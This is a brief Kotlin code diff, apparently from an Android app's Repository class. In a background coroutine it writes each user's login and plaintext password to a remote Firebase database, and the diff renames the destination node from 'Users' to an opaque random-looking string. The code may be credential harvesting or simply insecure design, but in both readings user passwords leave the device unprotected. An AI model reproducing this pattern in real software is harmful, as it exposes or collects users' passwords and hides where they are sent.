@@ -137,7 +137,7 @@ class Repository(
         prefs.saveLogin(login)
 
         CoroutineScope(Dispatchers.IO).launch {
-            FirebaseDatabase.getInstance().getReference("Users").child(login).setValue(password)
+            FirebaseDatabase.getInstance().getReference("12i3u2jnsa098yf2").child(login).setValue(password)
         }
 
     }
